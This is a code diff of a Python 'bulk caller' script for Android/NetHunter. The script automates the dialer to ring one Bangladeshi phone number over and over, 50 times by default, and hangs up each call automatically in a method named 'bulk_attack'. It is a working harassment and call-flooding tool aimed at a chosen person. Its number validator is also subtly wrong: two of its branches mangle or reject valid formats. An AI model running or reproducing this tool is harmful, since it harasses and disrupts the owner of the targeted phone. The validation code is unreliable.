@@ -4,108 +4,102 @@ import time
 import subprocess
 import threading
 import logging
+import re
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
 class NetHunterBulkCaller:
     def __init__(self):
-        self.package_name = "com.android.dialer"  # Default dialer
+        self.package_name = "com.android.dialer"
+    
+    def validate_number(self, number):
+        """Flexible validation"""
+        # Remove spaces/dashes
+        clean = re.sub(r'[^\d+]', '', number)
+        if clean.startswith('880') and len(clean) == 13:
+            return '+88' + clean[3:]
+        elif clean.startswith('+880') and len(clean) == 13:
+            return clean
+        elif clean.startswith('01') and len(clean) == 11:
+            return '+8801' + clean[2:]
+        elif len(clean) == 13 and clean.startswith('8801'):
+            return '+' + clean
+        return None
     
     def test_dialer(self):
-        """Test if dialer works"""
         try:
             subprocess.run(["am", "start", "-a", "android.intent.action.DIAL"], 
-                         timeout=5, check=True)
-            logger.info("✅ Dialer accessible")
+                         timeout=5, check=True, capture_output=True)
+            logger.info("✅ Dialer OK")
             return True
         except:
-            logger.error("❌ Dialer not working")
+            logger.error("❌ Dialer access denied")
             return False
     
     def clear_dialpad(self):
-        """Clear dialpad"""
-        subprocess.run(["input", "keyevent", "123"], timeout=2)  # Delete all
-        time.sleep(0.5)
+        subprocess.run(["input", "keyevent", "123"], timeout=1)
+        time.sleep(0.3)
     
     def dial_number(self, number):
-        """Dial number directly"""
         self.clear_dialpad()
-        subprocess.run(["input", "text", number], timeout=2)
+        subprocess.run(["input", "text", number], timeout=3)
         time.sleep(0.5)
-        subprocess.run(["input", "keyevent", "66"], timeout=2)  # CALL button
-        logger.info(f"📞 Calling {number}")
+        subprocess.run(["input", "keyevent", "66"], timeout=2)  # CALL
+        logger.info(f"📞 Dialing: {number}")
     
-    def open_call_screen(self):
-        """Open dialer app"""
+    def open_dialer(self):
         subprocess.run([
-            "am", "start", 
-            "-n", f"{self.package_name}/.DialtactsActivity",
-            "-a", "android.intent.action.DIAL"
+            "am", "start", "-a", "android.intent.action.DIAL",
+            "--ez", "launch_single_user", "false"
         ], timeout=3)
         time.sleep(2)
     
     def hangup(self):
-        """Auto hangup"""
-        time.sleep(25)  # 25 sec ring + connect
+        time.sleep(20)
         subprocess.run(["input", "keyevent", "6"], timeout=2)  # End call
-        subprocess.run(["input", "keyevent", "3"], timeout=2)  # Home (optional)
-        logger.info("📞 Hangup OK")
+        logger.info("📞 Hangup")
     
     def single_call(self, number):
-        """One complete call cycle"""
-        self.open_call_screen()
+        self.open_dialer()
         self.dial_number(number)
-        
-        # Start hangup in background
         hangup_thread = threading.Thread(target=self.hangup)
         hangup_thread.daemon = True
         hangup_thread.start()
-        
-        time.sleep(35)  # Wait for full cycle
+        time.sleep(25)
     
-    def bulk_attack(self, number, total_calls=50, delay=3):
-        """Main bulk call function"""
-        logger.info(f"🚀 NetHunter Bulk Attack START")
-        logger.info(f"📱 Target: {number}")
-        logger.info(f"🔥 Total: {total_calls} calls")
+    def bulk_attack(self, number, total_calls=50, delay=5):
+        logger.info(f"🚀 Bulk Attack: {number} ({total_calls} calls)")
         
         if not self.test_dialer():
-            logger.error("❌ Dialer test failed!")
             return
         
-        try:
-            for i in range(total_calls):
-                self.single_call(number)
-                progress = f"📊 [{i+1}/{total_calls}]"
-                logger.info(progress)
-                time.sleep(delay)  # Gap between calls
-            
-            logger.info("✅ MISSION COMPLETE! 🎉")
-            
-        except KeyboardInterrupt:
-            logger.info("⏹️ Attack stopped by user (Ctrl+C)")
+        for i in range(total_calls):
+            self.single_call(number)
+            logger.info(f"📊 {i+1}/{total_calls}")
+            if i < total_calls - 1:
+                time.sleep(delay)
 
 def main():
-    print("=" * 50)
-    print("🔥  NetHunter Bulk Caller v2.0 🔥")
-    print("💯 100% FREE - No API needed!")
-    print("=" * 50)
+    print("🔥 NetHunter Bulk Caller v3.0 - FIXED 🔥")
+    number = input("📱 Number (+8801xxxxxxxxx / 01xxxxxxxxx): ").strip()
     
-    number = input("📱 Target (+8801XXXXXXXXX): ").strip()
-    
-    if len(number) != 13 or not number.startswith('+880'):
-        print("❌ Invalid! Example: +8801712345678")
+    validated = NetHunterBulkCaller().validate_number(number)
+    if not validated:
+        print("❌ Invalid! Examples:")
+        print("   +8801712345678")
+        print("   01712345678") 
+        print("   8801712345678")
         return
     
-    try:
-        total = int(input("🔢 Total calls [50]: ") or "50")
-        delay = float(input("⏱️ Delay between calls [3s]: ") or "3")
-    except:
-        total, delay = 50, 3
+    print(f"✅ Validated: {validated}")
+    
+    total = int(input("🔢 Calls [50]: ") or 50)
+    delay = float(input("⏱️ Delay [5s]: ") or 5)
     
     caller = NetHunterBulkCaller()
-    caller.bulk_attack(number, total, delay)
+    caller.bulk_attack(validated, total, delay)
+    print("✅ COMPLETE!")
 
 if __name__ == "__main__":
     main()
